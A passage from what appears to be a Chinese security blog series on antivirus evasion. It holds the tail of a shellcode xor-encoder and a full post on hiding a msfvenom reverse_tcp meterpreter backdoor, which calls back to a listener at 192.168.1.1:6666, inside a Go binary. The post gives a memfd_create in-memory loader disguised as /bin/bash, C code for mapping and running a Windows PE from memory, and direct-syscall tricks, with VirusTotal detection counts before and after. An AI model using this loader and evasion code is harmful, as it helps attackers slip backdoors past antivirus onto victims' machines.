</span></span><br><span class="line">    code = append_code(</span><br><span class="line">        code,</span><br><span class="line">        asm=<span class="string">"loop decode"</span>,</span><br><span class="line">        bytes_code=<span class="string">b"\xe2"</span> + bytes( [<span class="number">0xFF</span> - (current_index + <span class="number">2</span> - decode_label) + <span class="number">1</span> ] ),</span><br><span class="line">        compile=<span class="literal">False</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(code)</span></span><br><span class="line">    all_code_length = code[<span class="number">-1</span>][<span class="string">"index"</span>] + len(code[<span class="number">-1</span>][<span class="string">"bytes_code"</span>])</span><br><span class="line">    fpus_addr = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"[*] original code:"</span>)</span><br><span class="line">    <span class="comment"># 计算fpus指令地址之后的指令长度，来修正 xor 指令的偏移</span></span><br><span class="line">    <span class="keyword">for</span> t,i <span class="keyword">in</span> enumerate(code):</span><br><span class="line">        print(<span class="string">"\t&#123;&#125;:\t&#123;&#125;\t\t&#123;&#125;"</span>.format(i[<span class="string">"index"</span>],i[<span class="string">"asm"</span>],i[<span class="string">"bytes_code"</span>]))</span><br><span class="line">        asm = i[<span class="string">"asm"</span>]</span><br><span class="line">        index = i[<span class="string">"index"</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"fpus"</span> <span class="keyword">in</span> asm:</span><br><span class="line">            fpus_addr = index</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"decode"</span> <span class="keyword">in</span> asm:</span><br><span class="line">            code[t][<span class="string">"bytes_code"</span>][<span class="number">2</span>] = all_code_length - fpus_addr - ( code_length * <span class="number">4</span> - len(shellcode) )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"[*] fix code:"</span>)</span><br><span class="line"></span><br><span class="line">    decodeSub = []</span><br><span class="line">    <span class="keyword">for</span> t,i <span class="keyword">in</span> enumerate(code):</span><br><span class="line">        print( <span class="string">"\t&#123;&#125;:\t&#123;&#125;\t\t&#123;&#125;"</span>.format(i[<span class="string">"index"</span>],i[<span class="string">"asm"</span>],i[<span class="string">"bytes_code"</span>]))</span><br><span class="line">        decodeSub += i[<span class="string">"bytes_code"</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> decodeSub,shellcode,code_length*<span class="number">4</span>,key</span><br><span class="line">    <span class="comment"># code += ["loop decode"]</span></span><br></pre></td></tr></table></figure>

<p><strong>代码是临时写的，所以逻辑比较乱。等以后有时间了开发一个框架出来，再进行优化吧</strong></p>
<p>接下来把 decodeSub 和 shellcode 的内容依据 <code>key</code> 进行加密：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_encrypt</span><span class="params">(decodeSub,shellcode,length,key)</span>:</span></span><br><span class="line">    key = [i <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line">    allcode = decodeSub  + shellcode</span><br><span class="line">    subCode = allcode[-length:]</span><br><span class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> enumerate(subCode):</span><br><span class="line">        subCode[k] ^= key[ k%<span class="number">4</span> ]</span><br><span class="line">    </span><br><span class="line">    allcode[-length:] = subCode</span><br><span class="line">    <span class="keyword">return</span> allcode</span><br></pre></td></tr></table></figure>

<p>经过测试，shellcode 的功能正常，可以正常会连控制端:</p>
<p><img src="https://pic.wonderkun.cc/uploads/2021/05/2021-05-25-15-48-53.png" alt=""></p>
<p>上传到vt上进行检测:</p>
<p><img src="https://pic.wonderkun.cc/uploads/2021/05/2021-05-25-15-50-47.png" alt=""></p>
<p>竟然两个引擎报毒，这是出乎了我的意料，不过没关系，我们日后再慢慢解决。<br>本节内容到此为止。</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>杀软的无奈</tag>
      </tags>
  </entry>
  <entry>
    <title>杀软的无奈-最简单的免杀(二)</title>
    <url>/2021/03/24/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%85%8D%E6%9D%80(%E4%BA%8C)/</url>
    <content><![CDATA[<blockquote>
<p>本文首发于安全客: <a href="https://www.anquanke.com/post/id/242549" target="_blank" rel="noopener">https://www.anquanke.com/post/id/242549</a></p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>平时比较忙，抽不出来大把的时间来写文章，导致这个系列的更新太过于迟缓了。怕一直找理由鸽了自己，今天先更新一篇水文吧。主要说一下利用现成的工具完成比较简单的免杀工作。<br><strong>本文的核心目标是为了能够免杀任意的二进制，而不仅仅是为了免杀msf生成的shellcode，注意跟其他文章的区别</strong></p>
<a id="more"></a>


<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>今天要讲的主角其实是go语言。go语言是2009年google发布的语言，由于其有类似于c和c++一样的性能，同时还具备类似于解释性语言的垃圾回收机制，并且不像java一样依赖虚拟机，优秀的跨平台优势和1.4版本之后go语言实现的支持交叉编译的编译器，让它迅速火了起来。</p>
<p>但是优秀的同时，它以牺牲自己二进制的体积为代价，每个go二进制都静态链接了一个runtime库，此库实现了垃圾回收、线程调度、go语言特有的关键特性等任务。此库的功能非常强大，因为导致一个简单的”hello world”就有1700多个函数。<br>有如此多的函数，那从这一堆函数中找出具有恶意功能的函数简直像大海捞针一样困难，这是市面上的大部分杀毒引擎对go二进制的检测能力比较薄弱的一个原因。</p>
<p>本文主要是用go语言的相关工具，来彻底免杀之前会被查杀的elf恶意代码。(windows平台类似的方法，但是我并没有测试免杀效果。)</p>
<h2 id="开始正题"><a href="#开始正题" class="headerlink" title="开始正题"></a>开始正题</h2><p><strong>基本思想就是把一个不免杀的ELF文件作为字节数据存储在go编写的二进制中，然后go二进制执行的时候从自身读出恶意代码然后直接加载到内存中执行，保证恶意代码不落盘</strong></p>
<p>这个方法非常简单，不需要分析什么shellcode特征，甚至不需要写什么代码，就能实现效果不错的免杀，而且检测比较困难。</p>
<p>可选的工具有很多:</p>
<ul>
<li><a href="https://github.com/gobuffalo/packr" target="_blank" rel="noopener">https://github.com/gobuffalo/packr</a></li>
<li><a href="https://github.com/rakyll/statik" target="_blank" rel="noopener">https://github.com/rakyll/statik</a></li>
<li><a href="https://github.com/GeertJohan/go.rice" target="_blank" rel="noopener">https://github.com/GeertJohan/go.rice</a></li>
<li><a href="https://github.com/UnnoTed/fileb0x" target="_blank" rel="noopener">https://github.com/UnnoTed/fileb0x</a></li>
<li><a href="https://github.com/mjibson/esc" target="_blank" rel="noopener">https://github.com/mjibson/esc</a></li>
<li><a href="https://github.com/kevinburke/go-bindata" target="_blank" rel="noopener">https://github.com/kevinburke/go-bindata</a></li>
<li><a href="https://github.com/lu4p/binclude" target="_blank" rel="noopener">https://github.com/lu4p/binclude</a></li>
<li><a href="https://github.com/omeid/go-resources" target="_blank" rel="noopener">https://github.com/omeid/go-resources</a></li>
<li><a href="https://github.com/pyros2097/go-embed" target="_blank" rel="noopener">https://github.com/pyros2097/go-embed</a></li>
<li><a href="https://github.com/wlbr/mule" target="_blank" rel="noopener">https://github.com/wlbr/mule</a></li>
<li><a href="https://github.com/miscing/embed" target="_blank" rel="noopener">https://github.com/miscing/embed</a></li>
<li><a href="https://github.com/kyioptr/gassets" target="_blank" rel="noopener">https://github.com/kyioptr/gassets</a></li>
</ul>
<p>甚至 go1.6 就默认支持<a href="https://go.googlesource.com/proposal/+/master/design/draft-embed.md" target="_blank" rel="noopener">https://go.googlesource.com/proposal/+/master/design/draft-embed.md</a> ，你说开心不开心，默认支持的能有啥特征呢？ 哈哈哈哈</p>
<p>下面就先使用 <a href="https://github.com/kevinburke/go-bindata" target="_blank" rel="noopener">https://github.com/kevinburke/go-bindata</a> 来测试一下效果。</p>
<h2 id="linux平台免杀"><a href="#linux平台免杀" class="headerlink" title="linux平台免杀"></a>linux平台免杀</h2><ol>
<li>用msf生成一个后门</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p  linux/x64/meterpreter/reverse_tcp  -e x86/shikata_ga_nai -i 1 lhost=192.168.1.1 lport=6666 -f elf &gt; ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p>这个样本肯定是不免杀的，上传到virustotal上看一下。</p>
<p><img src="https://pic.wonderkun.cc/uploads/2021/03/2021-03-25-21-38-06.png" alt=""></p>
<p>竟然才仅有4款杀毒软件报毒，这太出乎意料了，是杀毒软件提不动刀了，还是metasploit的编码器太强了？不过 anyway，我们还是用go去加载这个二进制，看一下效果。</p>
<ol start="2">
<li>使用go-bindata 打包到一个文件中</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https://github.com/kevinburke/go-bindata</span></span><br><span class="line">./go-bindata ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p>这样就会生成一个  <code>bindata.go</code> 的文件，里面以压缩字节的形式存储这 ./test 的数据。</p>
<p><img src="https://pic.wonderkun.cc/uploads/2021/03/2021-03-25-21-51-03.png" alt=""></p>
<p>接下来在 <code>bindata.go</code> 中编写main函数，来让test文件从内存执行:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	mfdCloexec  = <span class="number">0x0001</span> <span class="comment">// 注意这个syscall 只有 3.17 之后的内核才支持,现在大部分的机器都支持了。</span></span><br><span class="line">	memfdCreate = <span class="number">319</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	</span><br><span class="line">	data, err := Asset(<span class="string">"test"</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="comment">// Asset was not found.</span></span><br><span class="line">		fmt.Println(<span class="string">"read test file content error!"</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	filename := <span class="string">""</span></span><br><span class="line"></span><br><span class="line">	fd, _, _ := syscall.Syscall(memfdCreate, <span class="keyword">uintptr</span>(unsafe.Pointer(&amp;filename)), <span class="keyword">uintptr</span>(mfdCloexec), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	_, _ = syscall.Write(<span class="keyword">int</span>(fd), data)</span><br><span class="line">	displayName := <span class="string">"/bin/bash"</span></span><br><span class="line"></span><br><span class="line">	fdPath := fmt.Sprintf(<span class="string">"/proc/self/fd/%d"</span>, fd)</span><br><span class="line">	_ = syscall.Exec(fdPath, []<span class="keyword">string</span>&#123;displayName&#125;, <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译之后，发现这个后门功能正常，上传到 virustotal 再看一下效果。</p>
<p><img src="https://pic.wonderkun.cc/uploads/2021/03/2021-03-25-22-10-39.png" alt=""></p>
<p>效果还算理想。这里可以放任意的会被杀软干掉的二进制，应该免杀效果都是杠杠的。 </p>
<h2 id="windows平台免杀"><a href="#windows平台免杀" class="headerlink" title="windows平台免杀"></a>windows平台免杀</h2><p>windows平台上也是同样的道理，只是windows没有 <code>memfd_create</code> 这样方便的syscall供我们调用，但是 「exe_run_in_memory」也很容易实现，下面我们尝试简单讲一下过程。<br>「exe_run_in_memory」可以直接用go语言实现，但是需要自己定义很多结构，而且不能像c语言那样便捷的处理PE结构，所以本文为了节省时间，直接复用了之前c语言来实现的加载的代码，然后用cgo进行调用。</p>
<p>用c语言来实现内存的map：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">mapping</span><span class="params">(LPVOID lpData, LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData;</span><br><span class="line">	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((UNPTR)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	<span class="comment">// 获取SizeOfHeaders的值: 所有头+节表头的大小</span></span><br><span class="line">	DWORD dwSizeOfHeaders = pNtHeaders-&gt;OptionalHeader.SizeOfHeaders;</span><br><span class="line">	<span class="comment">// 获取节表的数量</span></span><br><span class="line">	WORD wNumberOfSections = pNtHeaders-&gt;FileHeader.NumberOfSections;</span><br><span class="line">	<span class="comment">// 获取第一个节表头的地址</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + sizeof(IMAGE_NT_HEADERS));</span></span><br><span class="line"><span class="comment">	这样计算是错误的,因为 64 位程序和 32 位程序 IMAGE_NT_HEADERS 的大小不一样</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) &#123;</span><br><span class="line">	   <span class="comment">// 32 位镜像 </span></span><br><span class="line">		pSectionHeader = (PIMAGE_SECTION_HEADER)((UNPTR)pNtHeaders + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS32));</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) &#123;</span><br><span class="line"></span><br><span class="line">		pSectionHeader = (PIMAGE_SECTION_HEADER)((UNPTR)pNtHeaders + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS64));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	    <span class="comment">// 无法识别的 EXE 镜像 </span></span><br><span class="line">		ShowError(<span class="string">"cann't identify file format."</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 加载 所有头+节表头的大小</span></span><br><span class="line">	<span class="built_in">memcpy</span>(lpBaseAddress, lpData, dwSizeOfHeaders);</span><br><span class="line">	<span class="comment">// 对齐SectionAlignment循环加载节表</span></span><br><span class="line">	WORD i = <span class="number">0</span>;</span><br><span class="line">	LPVOID lpSrcMem = <span class="literal">NULL</span>;</span><br><span class="line">	LPVOID lpDestMem = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwSizeOfRawData = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; wNumberOfSections; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((<span class="number">0</span> == pSectionHeader-&gt;VirtualAddress) ||</span><br><span class="line">			(<span class="number">0</span> == pSectionHeader-&gt;SizeOfRawData))</span><br><span class="line">		&#123;</span><br><span class="line">			pSectionHeader++;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		lpSrcMem = (LPVOID)((UNPTR)lpData + pSectionHeader-&gt;PointerToRawData);</span><br><span class="line">		lpDestMem = (LPVOID)((UNPTR)lpBaseAddress + pSectionHeader-&gt;VirtualAddress);</span><br><span class="line">		dwSizeOfRawData = pSectionHeader-&gt;SizeOfRawData;</span><br><span class="line">		<span class="built_in">memcpy</span>(lpDestMem, lpSrcMem, dwSizeOfRawData);</span><br><span class="line"></span><br><span class="line">		pSectionHeader++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解析导入表,并修改IAT地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">doImTable</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((UNPTR)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR pImportTable = <span class="literal">NULL</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) &#123;</span><br><span class="line">		<span class="comment">// 如果是64位 </span></span><br><span class="line">		PIMAGE_NT_HEADERS64 pNtHeaders64 = (PIMAGE_NT_HEADERS64)(pNtHeaders);</span><br><span class="line">		pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((UNPTR)pDosHeader +</span><br><span class="line">			pNtHeaders64-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) &#123;</span><br><span class="line">		<span class="comment">// 如果是32位 </span></span><br><span class="line">		pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((UNPTR)pDosHeader +</span><br><span class="line">			pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 循环遍历DLL导入表中的DLL及获取导入表中的函数地址</span></span><br><span class="line">	<span class="keyword">char</span> *lpDllName = <span class="literal">NULL</span>;</span><br><span class="line">	HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_THUNK_DATA lpImportNameArray = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_IMPORT_BY_NAME lpImportByName = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_THUNK_DATA lpImportFuncAddrArray = <span class="literal">NULL</span>;</span><br><span class="line">	FARPROC lpFuncAddress = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="number">0</span> == pImportTable-&gt;OriginalFirstThunk)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 获取导入表中DLL的名称并加载DLL</span></span><br><span class="line">		lpDllName = (<span class="keyword">char</span> *)((UNPTR)pDosHeader + pImportTable-&gt;Name);</span><br><span class="line">		hDll = GetModuleHandleA(lpDllName);</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == hDll)</span><br><span class="line">		&#123;</span><br><span class="line">			hDll = LoadLibraryA(lpDllName);</span><br><span class="line">			<span class="keyword">if</span> (<span class="literal">NULL</span> == hDll)</span><br><span class="line">			&#123;</span><br><span class="line">				pImportTable++;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		i = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// 获取OriginalFirstThunk以及对应的导入函数名称表首地址</span></span><br><span class="line">		lpImportNameArray = (PIMAGE_THUNK_DATA)((UNPTR)pDosHeader + pImportTable-&gt;OriginalFirstThunk);</span><br><span class="line">		<span class="comment">// 获取FirstThunk以及对应的导入函数地址表首地址</span></span><br><span class="line">		lpImportFuncAddrArray = (PIMAGE_THUNK_DATA)((UNPTR)pDosHeader + pImportTable-&gt;FirstThunk);</span><br><span class="line">		<span class="keyword">while</span> (TRUE)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="number">0</span> == lpImportNameArray[i].u1.AddressOfData)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 获取IMAGE_IMPORT_BY_NAME结构</span></span><br><span class="line">			lpImportByName = (PIMAGE_IMPORT_BY_NAME)((UNPTR)pDosHeader + lpImportNameArray[i].u1.AddressOfData);</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 判断导出函数是序号导出还是函数名称导出</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="number">0x80000000</span> &amp; lpImportNameArray[i].u1.Ordinal)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// 序号导出</span></span><br><span class="line">				<span class="comment">// 当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式输入，这时，低位被看做是一个函数序号</span></span><br><span class="line">				lpFuncAddress = GetProcAddress(hDll, (LPCSTR)(lpImportNameArray[i].u1.Ordinal &amp; <span class="number">0x0000FFFF</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// 名称导出</span></span><br><span class="line">				lpFuncAddress = GetProcAddress(hDll, (LPCSTR)lpImportByName-&gt;Name);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 注意此处的函数地址表的赋值，要对照PE格式进行装载，不要理解错了！！！</span></span><br><span class="line">			lpImportFuncAddrArray[i].u1.Function = (UNPTR)lpFuncAddress;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		pImportTable++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解析重定位信息：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DoReTable</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* 重定位表的结构：</span></span><br><span class="line"><span class="comment">	// DWORD sectionAddress, DWORD size (包括本节需要重定位的数据)</span></span><br><span class="line"><span class="comment">	// 例如 1000节需要修正5个重定位数据的话，重定位表的数据是</span></span><br><span class="line"><span class="comment">	// 00 10 00 00   14 00 00 00      xxxx xxxx xxxx xxxx xxxx 0000</span></span><br><span class="line"><span class="comment">	// -----------   -----------      ----</span></span><br><span class="line"><span class="comment">	// 给出节的偏移  总尺寸=8+6*2     需要修正的地址           用于对齐4字节</span></span><br><span class="line"><span class="comment">	// 重定位表是若干个相连，如果address 和 size都是0 表示结束</span></span><br><span class="line"><span class="comment">	// 需要修正的地址是12位的，高4位是形态字，intel cpu下是3</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="comment">//假设NewBase是0x600000,而文件中设置的缺省ImageBase是0x400000,则修正偏移量就是0x200000</span></span><br><span class="line">	<span class="comment">//注意重定位表的位置可能和硬盘文件中的偏移地址不同，应该使用加载后的地址</span></span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((UNPTR)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">	PIMAGE_BASE_RELOCATION pLoc = <span class="literal">NULL</span>;</span><br><span class="line">	ULONGLONG   ImageBase = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) &#123;</span><br><span class="line">		<span class="comment">// 如果是64位 </span></span><br><span class="line">		PIMAGE_NT_HEADERS64 pNtHeaders64 = (PIMAGE_NT_HEADERS64)(pNtHeaders);</span><br><span class="line">		pLoc = (PIMAGE_BASE_RELOCATION)((UNPTR)pDosHeader + pNtHeaders64-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line">		ImageBase = pNtHeaders64-&gt;OptionalHeader.ImageBase;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) &#123;</span><br><span class="line">		<span class="comment">// 如果是32位 </span></span><br><span class="line">		pLoc = (PIMAGE_BASE_RELOCATION)((UNPTR)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line">		ImageBase = pNtHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 判断是否有 重定位表</span></span><br><span class="line">	<span class="keyword">if</span> ((PVOID)pLoc == (PVOID)pDosHeader)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 重定位表 为空</span></span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> ((pLoc-&gt;VirtualAddress + pLoc-&gt;SizeOfBlock) != <span class="number">0</span>) <span class="comment">//开始扫描重定位表</span></span><br><span class="line">	&#123;</span><br><span class="line">		WORD *pLocData = (WORD *)((PBYTE)pLoc + <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line">		<span class="comment">//计算本节需要修正的重定位项（地址）的数目</span></span><br><span class="line">		<span class="keyword">int</span> nNumberOfReloc = (pLoc-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="keyword">sizeof</span>(WORD);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nNumberOfReloc; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 每个WORD由两部分组成。高4位指出了重定位的类型，WINNT.H中的一系列IMAGE_REL_BASED_xxx定义了重定位类型的取值。</span></span><br><span class="line">			<span class="comment">// 低12位是相对于VirtualAddress域的偏移，指出了必须进行重定位的位置。</span></span><br><span class="line"></span><br><span class="line">			<span class="meta">#<span class="meta-keyword">ifdef</span> _WIN64</span></span><br><span class="line">			<span class="keyword">if</span> ((DWORD)(pLocData[i] &amp; <span class="number">0x0000F000</span>) == <span class="number">0x0000A000</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="comment">// 64位dll重定位，IMAGE_REL_BASED_DIR64</span></span><br><span class="line">			<span class="comment">// 对于IA-64的可执行文件，重定位似乎总是IMAGE_REL_BASED_DIR64类型的。</span></span><br><span class="line"></span><br><span class="line">				UNPTR* pAddress = (UNPTR *)((PBYTE)pDosHeader + pLoc-&gt;VirtualAddress + (pLocData[i] &amp; <span class="number">0x0FFF</span>));</span><br><span class="line">				UNPTR ullDelta = (UNPTR)pDosHeader - ImageBase;</span><br><span class="line">			    *pAddress += ullDelta;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">            <span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">			<span class="keyword">if</span> ((DWORD)(pLocData[i] &amp; <span class="number">0x0000F000</span>) == <span class="number">0x00003000</span>) <span class="comment">//这是一个需要修正的地址</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">// 32位dll重定位，IMAGE_REL_BASED_HIGHLOW</span></span><br><span class="line">				<span class="comment">// 对于x86的可执行文件，所有的基址重定位都是IMAGE_REL_BASED_HIGHLOW类型的。</span></span><br><span class="line">				UNPTR* pAddress = (UNPTR*)((PBYTE)pDosHeader + pLoc-&gt;VirtualAddress + (pLocData[i] &amp; <span class="number">0x0FFF</span>));</span><br><span class="line">				UNPTR dwDelta = (UNPTR)pDosHeader - ImageBase;</span><br><span class="line">				*pAddress += dwDelta;</span><br><span class="line"></span><br><span class="line">		    &#125;</span><br><span class="line">            <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//转移到下一个节进行处理</span></span><br><span class="line">		pLoc = (PIMAGE_BASE_RELOCATION)((PBYTE)pLoc + pLoc-&gt;SizeOfBlock);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于函数 <code>VirtualAlloc</code> 是杀毒软件关注的重点函数，所以直接使用这个函数会被大多数的杀软杀掉，本文在VT上测试的时候是<code>18/69</code>,而且直接被火绒干掉，效果非常不理想:<br><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-00-58-55.png" alt=""></p>
<p>后来我利用项目 <a href="https://github.com/mai1zhi2/SysWhispers2_x86/tree/main/SysWhispers2_x86_WOW64Gate" target="_blank" rel="noopener">https://github.com/mai1zhi2/SysWhispers2_x86/tree/main/SysWhispers2_x86_WOW64Gate</a>中函数 <code>NtAllocateVirtualMemory</code> 的direct syscall 汇编代码来代替函数调用，然后获得了比较好的免杀效果。</p>
<p>同样使用 <code>msf</code> 生成的reverse_tcp后门进行测试：<br>免杀前的是 <code>52/70</code></p>
<p><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-01-04-57.png" alt=""></p>
<p>免杀后是 <code>12/67</code>:</p>
<p><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-01-06-11.png" alt=""></p>
